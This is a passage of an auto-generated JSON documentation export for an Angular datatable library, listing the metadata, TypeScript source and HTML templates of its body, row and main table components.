                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "CdkVirtualScrollViewport"
                        }
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "horzScrollPosition",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 152,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 144
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 136
                },
                {
                    "name": "onKeyDownHandler",
                    "args": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent"
                        },
                        {
                            "name": "rowEl",
                            "type": "HTMLDivElement"
                        },
                        {
                            "name": "activationData",
                            "type": "RowSelection<T> | RowActivation<T>"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 248,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "rowEl",
                            "type": "HTMLDivElement",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "activationData",
                            "type": "RowSelection<T> | RowActivation<T>",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "selectRow",
                    "args": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent | MouseEvent"
                        },
                        {
                            "name": "activationData",
                            "type": "RowSelection<T>"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 235,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent | MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "activationData",
                            "type": "RowSelection<T>",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "virtHorzScrollPosition",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 195,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "window:resize",
                    "args": [],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 111
                }
            ],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostListener,\n  Input,\n  KeyValueDiffer,\n  KeyValueDiffers,\n  OnDestroy,\n  Output,\n  TemplateRef,\n  ViewChild\n} from '@angular/core';\nimport { Subject } from 'rxjs';\nimport { RowActivation, RowContextMenu, RowSelection } from '../events';\nimport { Column, ColumnDisplay } from '../columns';\nimport { CdkVirtualScrollViewport } from '@angular/cdk/scrolling';\nimport { SelectionModes } from '../selection-modes';\nimport { rowClassFn } from '../models';\n\n@Component({\n  selector: 'sto-datatable-body',\n  templateUrl: './sto-datatable-body.component.html',\n  styleUrls: [ './sto-datatable-body.component.scss' ]\n})\nexport class StoDatatableBodyComponent<T extends Record<string, unknown>> implements OnDestroy, AfterViewInit {\n\n  @Input()\n  get scrollbarH(): boolean {\n    return this._scrollbarH;\n  }\n\n  set scrollbarH(scrollbarH: boolean) {\n    this._scrollbarH = scrollbarH;\n    this.horizontalScrollActive = false;\n    if ( this.resizeObserver ) {\n      this.resizeObserver.disconnect();\n    }\n    if ( scrollbarH && this.virtualScroll && this.vScroller ) {\n      this.virtHorzScrollPosition();\n    } else if ( scrollbarH ) {\n      this.horzScrollPosition();\n    }\n    requestAnimationFrame(() => window.dispatchEvent(new Event('resize')));\n  }\n\n  @ViewChild('scrollViewport', { read: ElementRef })\n  scrollElement: ElementRef<HTMLElement>;\n  @Input()\n  responsive: boolean;\n  @Input()\n  disableRipple: boolean;\n  @Input()\n  smallView: boolean;\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  height: number | null;\n  @Input()\n  rows: Array<T>;\n  @Input()\n  selectable: boolean;\n  @Input()\n  width: string;\n  @Input()\n  rowHeight: number;\n  @Input()\n  selected: T;\n  @Input()\n  columns: Column[];\n  @Input()\n  virtualScroll: boolean;\n  @Input()\n  columnMode: ColumnDisplay;\n\n  private _scrollbarH: boolean;\n  @Input()\n  rowClass: rowClassFn;\n  @Input()\n  selectionMode: SelectionModes;\n  @Input()\n  scrollLeft: string | null;\n  @Input()\n  hasFooter: boolean;\n  @Output()\n  rowSelected = new EventEmitter<RowSelection<T>>();\n  @Output()\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\n  @Output()\n  activate = new EventEmitter<RowActivation<T>>();\n  @Output()\n  scrollHeader = new EventEmitter<Event>();\n  @ViewChild(CdkVirtualScrollViewport)\n  vScroller: CdkVirtualScrollViewport;\n  @ViewChild('scroller')\n  scroller: ElementRef<HTMLDivElement>;\n\n  private destroyed$ = new Subject<boolean>();\n  private rowDiffer: KeyValueDiffer<T, T>;\n  private timeout: number | undefined;\n  private resizeObserver: ResizeObserver;\n  public horizontalScrollActive: boolean;\n  public verticalScrollOffset = 0;\n\n  constructor(private differs: KeyValueDiffers) {\n    this.rowDiffer = differs.find({}).create();\n  }\n\n  @HostListener('window:resize', [ '$event' ])\n  onresize() {\n    if ( !this.vScroller ) {\n      return;\n    }\n    if ( this.timeout ) {\n      clearTimeout(this.timeout);\n    }\n    this.timeout = setTimeout(() => {\n      this.vScroller.ngOnInit();\n    }, 100);\n  }\n\n  @Input()\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  trackBy = (index: number, item: T) => {\n    return index;\n  }\n  _rowClass = (row: T) => {\n    let userDefinedClass = '';\n    if ( this.rowClass ) {\n      userDefinedClass = this.rowClass.bind(this)(row);\n    }\n    return `${userDefinedClass} sto-mdl-table__body__row`;\n  }\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n    if ( this.resizeObserver ) {\n      this.resizeObserver.disconnect();\n    }\n  }\n\n  ngAfterViewInit() {\n    if ( this.scrollbarH && this.virtualScroll ) {\n      this.virtHorzScrollPosition();\n    } else if ( this.scrollbarH ) {\n      this.horzScrollPosition();\n    }\n  }\n\n  private horzScrollPosition() {\n    if ( !this.scroller ) {\n      return;\n    }\n    const elRef = this.scroller.nativeElement;\n    const cb: ResizeObserverCallback = (entries) => {\n      if ( !this.hasFooter ) {\n        return;\n      }\n      for ( const entry of entries ) {\n        const t = entry.target as HTMLElement;\n        const el = t;\n        const currentScale = el.style.transform;\n        const notScaled = this.rows.length * this.rowHeight;\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\n        if ( t.scrollWidth > t.offsetWidth ) {\n          this.horizontalScrollActive = true;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale === notScaled ) {\n            const newScaleValue = notScaled + this.rowHeight;\n            el.style.transform = `scaleY(${newScaleValue}`;\n          }\n        } else {\n          this.horizontalScrollActive = false;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale !== notScaled ) {\n            el.style.transform = `scaleY(${notScaled}`;\n          }\n        }\n      }\n    };\n    this.resizeObserver = new ResizeObserver(cb);\n    this.resizeObserver.observe(elRef);\n  }\n\n  private virtHorzScrollPosition() {\n    const elRef = this.vScroller.elementRef.nativeElement;\n    const cb: ResizeObserverCallback = (entries) => {\n      if ( !this.hasFooter ) {\n        return;\n      }\n      for ( const entry of entries ) {\n        const t = entry.target as HTMLElement;\n        const el = t.querySelector('.cdk-virtual-scroll-spacer') as HTMLDivElement;\n        const currentScale = el.style.transform;\n        const notScaled = this.rows.length * this.rowHeight;\n        this.verticalScrollOffset = t.scrollHeight > t.offsetHeight ? 14 : 0;\n        if ( t.scrollWidth > t.offsetWidth ) {\n          this.horizontalScrollActive = true;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale === notScaled ) {\n            const newScaleValue = notScaled + this.rowHeight;\n            el.style.transform = `scaleY(${newScaleValue}`;\n          }\n        } else {\n          this.horizontalScrollActive = false;\n          const strScale = /\\d+/.exec(currentScale || '');\n          if ( !strScale ) {\n            return;\n          }\n          const numericScale = Number(strScale[ 0 ]);\n          if ( numericScale !== notScaled ) {\n            el.style.transform = `scaleY(${notScaled}`;\n          }\n        }\n      }\n    };\n    this.resizeObserver = new ResizeObserver(cb);\n    this.resizeObserver.observe(elRef);\n  }\n\n  selectRow(event: KeyboardEvent | MouseEvent, activationData: RowSelection<T>) {\n    if ( event.type === this.selectionMode ) {\n      this.rowSelected.emit(activationData);\n      const el = event.target as HTMLElement;\n      const ignoreRe = /.*mat-select.*|.*mat-option.*|.*mat-input.*|.*mat-form.*/i;\n      const elTag = el.tagName.toLowerCase();\n      const isIgnoredEl = ignoreRe.test(el.className) || elTag === 'input';\n      if ( !isIgnoredEl ) {\n        activationData.rowEl?.focus();\n      }\n    }\n  }\n\n  onKeyDownHandler(event: KeyboardEvent, rowEl: HTMLDivElement, activationData: RowSelection<T> | RowActivation<T>) {\n    this.activate.emit({ event, rowEl, row: activationData.row, index: activationData.index });\n    const next = rowEl.nextSibling as HTMLDivElement;\n    const prev = rowEl.previousSibling as HTMLDivElement;\n    switch ( event.key ) {\n      case 'ArrowDown':\n        if ( next && next instanceof HTMLElement ) {\n          next.focus();\n          event.preventDefault();\n        }\n        break;\n      case 'ArrowUp':\n        if ( prev && prev instanceof HTMLElement ) {\n          prev.focus();\n          event.preventDefault();\n        }\n        break;\n      case 'Enter':\n        this.rowSelected.emit(activationData);\n        break;\n    }\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "./sto-datatable-body.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "differs",
                        "type": "KeyValueDiffers"
                    }
                ],
                "line": 104,
                "jsdoctags": [
                    {
                        "name": "differs",
                        "type": "KeyValueDiffers",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnDestroy",
                "AfterViewInit"
            ],
            "accessors": {
                "scrollbarH": {
                    "name": "scrollbarH",
                    "setSignature": {
                        "name": "scrollbarH",
                        "type": "void",
                        "args": [
                            {
                                "name": "scrollbarH",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 34,
                        "jsdoctags": [
                            {
                                "name": "scrollbarH",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                }
            },
            "templateData": "<cdk-virtual-scroll-viewport [itemSize]=\"(!smallView || !responsive) ? rowHeight : 80\"\n                             *ngIf=\"virtualScroll\"\n                             [style.height.px]=\"(height || 500) \"\n                             (scroll)=\"scrollHeader.emit($event)\"\n                             [class.sto-mdl-table__body--selectable]=\"selectable\"\n                             #scrollViewport\n                             [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\n                             class=\"sto-mdl-table__body\">\n  <sto-datatable-body-row *cdkVirtualFor=\"let row of rows; templateCacheSize: 0; let i = index; let last = last; trackBy: trackBy\"\n                          matRipple\n                          [matRippleDisabled]=\"disableRipple\"\n                          [matRippleUnbounded]=\"false\"\n                          [style.min-width]=\"width\"\n                          [style.transform]=\"scrollLeft\"\n                          [columnMode]=\"columnMode\"\n                          [tabindex]=\"0\"\n                          [columns]=\"columns\"\n                          [row]=\"row\"\n                          [responsiveView]=\"responsiveView\"\n                          [rowIndex]=\"i\"\n                          [rowClass]=\"rowClass\"\n                          #rowEl\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\n                          [isSelected]=\"selected === row\"\n                          [compressedView]=\"smallView && responsive\"\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          [style.overflow]=\"disableRipple ? 'visible' : 'hidden'\"\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n  </sto-datatable-body-row>\n  <sto-datatable-body-row [style.height.px]=\"rowHeight\"\n                          *ngIf=\"scrollbarH && hasFooter\"></sto-datatable-body-row>\n</cdk-virtual-scroll-viewport>\n\n<div class=\"sto-mdl-table__body sto-mdl-table__body--no-vscroll\"\n     *ngIf=\"!virtualScroll\"\n     (scroll)=\"scrollHeader.emit($event)\"\n     #scroller\n     [class.sto-mdl-table__body--scrollbar-h]=\"scrollbarH\"\n     [class.sto-mdl-table__body--selectable]=\"selectable\"\n     [style.padding-bottom.px]=\"horizontalScrollActive && hasFooter ? rowHeight : 0\"\n     [style.height]=\"height ? (height + 'px') : 'auto'\">\n\n  <sto-datatable-body-row *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\n                          [style.min-width]=\"width\"\n                          [tabindex]=\"0\"\n                          [columns]=\"columns\"\n                          [row]=\"row\"\n                          [responsiveView]=\"responsiveView\"\n                          [rowIndex]=\"i\"\n                          [rowClass]=\"rowClass\"\n                          #rowEl\n                          (keydown)=\"onKeyDownHandler($event, rowEl.element, {index: i, event: $event, row: row})\"\n                          [isSelected]=\"selected === row\"\n                          [compressedView]=\"smallView && responsive\"\n                          (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                          (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          (dblclick)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl.element})\"\n                          [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n  </sto-datatable-body-row>\n  <!--<div *ngFor=\"let row of rows; let i = index; trackBy: trackBy\"\n       [tabindex]=\"0\"\n       #rowEl\n       (keydown)=\"onKeyDownHandler($event, rowEl, {index: i, event: $event, row: row})\"\n       [ngClass]=\"_rowClass | exec:row\"\n       [class.sto-mdl-table__body__row&#45;&#45;selected]=\"selected === row\"\n       (click)=\"selectRow($event, {index: i, event: $event, row: row, rowEl: rowEl})\"\n       [style.height]=\"((!smallView || !responsive) ? rowHeight : 80) + 'px'\">\n    <ng-container *ngIf=\"smallView && responsive; else regular\">\n      <ng-template [ngTemplateOutlet]=\"responsiveView\"\n                   [ngTemplateOutletContext]=\"{row: row}\">\n      </ng-template>\n    </ng-container>\n    <ng-template #regular>\n      <div class=\"sto-mdl-table__body__row__cell\"\n           [ngClass]=\"column.cellClass | exec:row[column.prop]:row:column\"\n           [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\n           [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\n           [style.flex-basis]=\"(column.flexBasis || 80) + 'px'\"\n           (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: i})\"\n           *ngFor=\"let column of columns;\">\n        <span *ngIf=\"!column.cellTemplate\"\n              [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\n        <ng-template #cellTemplate\n                     *ngIf=\"column.cellTemplate\"\n                     [ngTemplateOutlet]=\"column.cellTemplate\"\n                     [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: i}\">\n        </ng-template>\n      </div>\n    </ng-template>\n  </div>-->\n</div>\n"
        },
        {
            "name": "StoDatatableBodyRowComponent",
            "id": "component-StoDatatableBodyRowComponent-41aab8ccead377ad2f60d813f455001c",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-body-row",
            "styleUrls": [
                "./sto-datatable-body-row.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable-body-row.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "columnMode",
                    "line": 42,
                    "type": "ColumnDisplay"
                },
                {
                    "name": "columns",
                    "line": 30,
                    "type": "Column[]"
                },
                {
                    "name": "compressedView",
                    "line": 32,
                    "type": "boolean"
                },
                {
                    "name": "isSelected",
                    "line": 38,
                    "type": "boolean"
                },
                {
                    "name": "responsiveView",
                    "line": 26,
                    "type": "TemplateRef<unknown>"
                },
                {
                    "name": "row",
                    "line": 28,
                    "type": "T"
                },
                {
                    "name": "rowClass",
                    "line": 36,
                    "type": "rowClassFn"
                },
                {
                    "name": "rowIndex",
                    "line": 34,
                    "type": "number"
                }
            ],
            "outputsClass": [
                {
                    "name": "rowContextMenu",
                    "defaultValue": "new EventEmitter()",
                    "line": 40,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "element",
                    "type": "HTMLDivElement",
                    "optional": false,
                    "description": "",
                    "line": 44,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "rowDiffer",
                    "type": "KeyValueDiffer<unknown | unknown>",
                    "optional": false,
                    "description": "",
                    "line": 73,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngDoCheck",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 80
                }
            ],
            "hostBindings": [
                {
                    "name": "class",
                    "line": 48
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  DoCheck,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  KeyValueDiffer,\n  KeyValueDiffers,\n  Output,\n  TemplateRef\n} from '@angular/core';\nimport { Column, ColumnDisplay } from '../../columns';\nimport { rowClassFn } from '../../models';\n\n@Component({\n  selector: 'sto-datatable-body-row',\n  templateUrl: './sto-datatable-body-row.component.html',\n  styleUrls: ['./sto-datatable-body-row.component.scss'],\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoDatatableBodyRowComponent<T extends Record<string, unknown>> implements DoCheck {\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  row: T;\n  @Input()\n  columns: Column[];\n  @Input()\n  compressedView: boolean;\n  @Input()\n  rowIndex: number;\n  @Input()\n  rowClass: rowClassFn;\n  @Input()\n  isSelected: boolean;\n  @Output()\n  rowContextMenu = new EventEmitter();\n  @Input()\n  columnMode: ColumnDisplay;\n\n  public element: HTMLDivElement;\n\n\n  @HostBinding('class')\n  get cssClass() {\n    let cls = 'sto-mdl-table__body__row';\n    if ( this.isSelected ) {\n      cls += ' sto-mdl-table__body__row--selected';\n    }\n\n    if ( this.rowClass ) {\n      let userClass = ' ';\n      if ( typeof this.rowClass === 'function' ) {\n        userClass += this.rowClass(this.row);\n      } else if ( typeof this.rowClass === 'object' && !!this.rowClass ) {\n        userClass += Object.values(this.rowClass).join(' ');\n      } else if ( typeof this.rowClass === 'string' ) {\n        userClass += this.rowClass;\n      }\n      cls += userClass;\n    }\n\n    if ( this.compressedView ) {\n      cls += ' sto-mdl-table__body__row--compressed';\n    }\n\n    return cls;\n  }\n\n  private rowDiffer: KeyValueDiffer<unknown, unknown>;\n\n  constructor(private differs: KeyValueDiffers, private cdr: ChangeDetectorRef, private elRef: ElementRef) {\n    this.rowDiffer = differs.find({}).create();\n    this.element = this.elRef.nativeElement as HTMLDivElement;\n  }\n\n  ngDoCheck() {\n    if ( this.rowDiffer.diff(this.row) ) {\n      this.cdr.detectChanges();\n    }\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "./sto-datatable-body-row.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "differs",
                        "type": "KeyValueDiffers"
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef"
                    }
                ],
                "line": 73,
                "jsdoctags": [
                    {
                        "name": "differs",
                        "type": "KeyValueDiffers",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "DoCheck"
            ],
            "templateData": "<!--<div>-->\n<ng-container *ngIf=\"compressedView; else regular\">\n  <ng-template [ngTemplateOutlet]=\"responsiveView\"\n               [ngTemplateOutletContext]=\"{row: row}\">\n  </ng-template>\n</ng-container>\n<ng-template #regular>\n  <div class=\"sto-mdl-table__body__row__cell\"\n       [ngClass]=\"column.cellClass | exec:row[column.prop]:column:row\"\n       [ngStyle]=\"column | columnStyle:columnMode\"\n\n       (contextmenu)=\"rowContextMenu.emit({event: $event, column: column, row: row, index: rowIndex})\"\n       *ngFor=\"let column of columns;\">\n    <span *ngIf=\"!column.cellTemplate\"\n          [title]=\"row[column.prop] || ''\">{{ row[column.prop] }}</span>\n    <ng-template #cellTemplate\n                 *ngIf=\"column.cellTemplate\"\n                 [ngTemplateOutlet]=\"column.cellTemplate\"\n                 [ngTemplateOutletContext]=\"{row: row, column: column, value: row[column.prop], index: rowIndex}\">\n    </ng-template>\n  </div>\n</ng-template>\n<!--</div>-->\n"
        },
        {
            "name": "StoDatatableComponent",
            "id": "component-StoDatatableComponent-ba1a4ccc7df36466e5b19aa25cadacf5",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable",
            "styleUrls": [
                "./sto-datatable.component.scss",
                "./sto-datatable-progress-bar.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "autoSize",
                    "line": 170,
                    "type": "boolean"
                },
                {
                    "name": "autoSizeOffset",
                    "defaultValue": "0",
                    "line": 172
                },
                {
                    "name": "columnGroups",
                    "line": 204,
                    "type": "ColumnGroup[]"
                },
                {
                    "name": "columnMode",
                    "line": 110,
                    "type": "ColumnDisplay"
                },
                {
                    "name": "columns",
                    "line": 119,
                    "type": "Column[]"
                },
                {
                    "name": "disableRipple",
                    "line": 159,
                    "type": "boolean"
                },
                {
                    "name": "elevation",
                    "defaultValue": "true",
                    "line": 201
                },
                {
                    "name": "emptyMessage",
                    "defaultValue": "`No records in set`",
                    "line": 151
                },
                {
                    "name": "footerRow",
                    "line": 95
                },
                {
                    "name": "headerHeight",
                    "defaultValue": "24",
                    "line": 153
                },
                {
                    "name": "height",
                    "line": 36
                },
                {
                    "name": "loading",
                    "line": 165,
                    "type": "boolean"
                },
                {
                    "name": "preserveSort",
                    "line": 174,
                    "type": "boolean"
                },
                {
                    "name": "resizeable",
                    "line": 219,
                    "type": "boolean"
                },
                {
                    "name": "responsive",
                    "line": 189,
                    "type": "boolean"
                },
                {
                    "name": "responsiveBreakPoint",
                    "defaultValue": "400",
                    "line": 193
                },
                {
                    "name": "responsiveView",
                    "line": 191,
                    "type": "TemplateRef<unknown>"
                },
                {
                    "name": "rowClass",
                    "line": 197,
                    "type": "rowClassFn"
                },
                {
                    "name": "rowHeight",
                    "defaultValue": "36",
                    "line": 147
                },
                {
                    "name": "rows",
                    "line": 67,
                    "type": "[]"
                },
                {
                    "name": "scrollbarH",
                    "line": 149,
                    "type": "boolean"
                },
                {
                    "name": "selected",
                    "line": 179,
                    "type": "T"
                },
                {
                    "name": "selectionMode",
                    "defaultValue": "SelectionModes.Click",
                    "line": 155,
                    "type": "SelectionModes"
                },
                {
                    "name": "sortable",
                    "line": 157,
                    "type": "boolean"
                },
                {
                    "name": "trackBy",
                    "defaultValue": "(index: number, item: T) => {\n    return index;\n  }",
                    "line": 234
                },
                {
                    "name": "virtualScroll",
                    "defaultValue": "true",
                    "line": 184
                }
            ],
            "outputsClass": [
                {
                    "name": "headerContextMenu",
                    "defaultValue": "new EventEmitter<HeaderContextMenu>()",
                    "line": 215,
                    "type": "EventEmitter"
                },
                {
                    "name": "resized",
                    "defaultValue": "new EventEmitter<Column>()",
                    "line": 211,
                    "type": "EventEmitter"
                },
                {
                    "name": "rowActivate",
                    "defaultValue": "new EventEmitter<RowActivation<T>>()",
                    "line": 217,
                    "type": "EventEmitter"
                },
                {
                    "name": "rowContextMenu",
                    "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
                    "line": 213,
                    "type": "EventEmitter"
                },
                {
                    "name": "select",
                    "defaultValue": "new EventEmitter<RowSelection<T>>()",
                    "line": 209,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_columnMode",
                    "type": "ColumnDisplay",
                    "optional": false,
                    "description": "",
                    "line": 186,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_columns",
                    "type": "Column[]",
                    "optional": false,
                    "description": "",
                    "line": 206,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_footerRow",
                    "type": "T",
                    "optional": false,
                    "description": "",
                    "line": 181,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_height",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 163,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_internalRows",
                    "type": "T[]",
                    "optional": false,
                    "description": "",
                    "line": 177,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_rows",
                    "type": "T[]",
                    "optional": false,
                    "description": "",
                    "line": 176,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "actions",
                    "type": "StoDatatableActionsComponent",
                    "optional": false,
                    "description": "",
                    "line": 145,
                    "decorators": [
                        {
                            "name": "ContentChild",
                            "stringifiedArguments": "StoDatatableActionsComponent"
                        }
                    ]
                },
                {
                    "name": "activeSort",
                    "type": "SortColumn | null",
                    "optional": false,
                    "description": "",
                    "line": 226,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "body",
                    "type": "StoDatatableBodyComponent<T>",
                    "optional": false,
                    "description": "",
                    "line": 143,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "StoDatatableBodyComponent"
                        }
                    ]
                },
                {
                    "name": "ColumnDisplay",
                    "defaultValue": "ColumnDisplay",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 161
                },
                {
                    "name": "columnTotalWidth",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 222,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "height$",
                    "type": "Observable<number>",
                    "optional": false,
                    "description": "",
                    "line": 166,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "resizeTimeout",
                    "type": "number | undefined",
                    "optional": false,
                    "description": "",
                    "line": 221,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "rowTotalHeight",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 167,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "scrollLeft",
                    "defaultValue": "'translate3d(0px, 0px, 0px)'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 224,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "scrollNum",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 225,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "smallScreen",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 194,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "defaultSortFn",
                    "args": [
                        {
                            "name": "a",
                            "type": "T"
                        },
                        {
                            "name": "b",
                            "type": "T"
                        },
                        {
                            "name": "col",
                            "type": "Column"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 346,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "a",
                            "type": "T",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "b",
                            "type": "T",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "col",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 247
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 280
                },
                {
                    "name": "onResize",
                    "args": [
                        {
                            "type": "literal type"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 363,
                    "jsdoctags": [
                        {
                            "type": "literal type",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "rowClick",
                    "args": [
                        {
                            "name": "row",
                            "type": "T"
                        },
                        {
                            "name": "index",
                            "type": "number"
                        },
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 238,
                    "jsdoctags": [
                        {
                            "name": "row",
                            "type": "T",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "index",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "event",
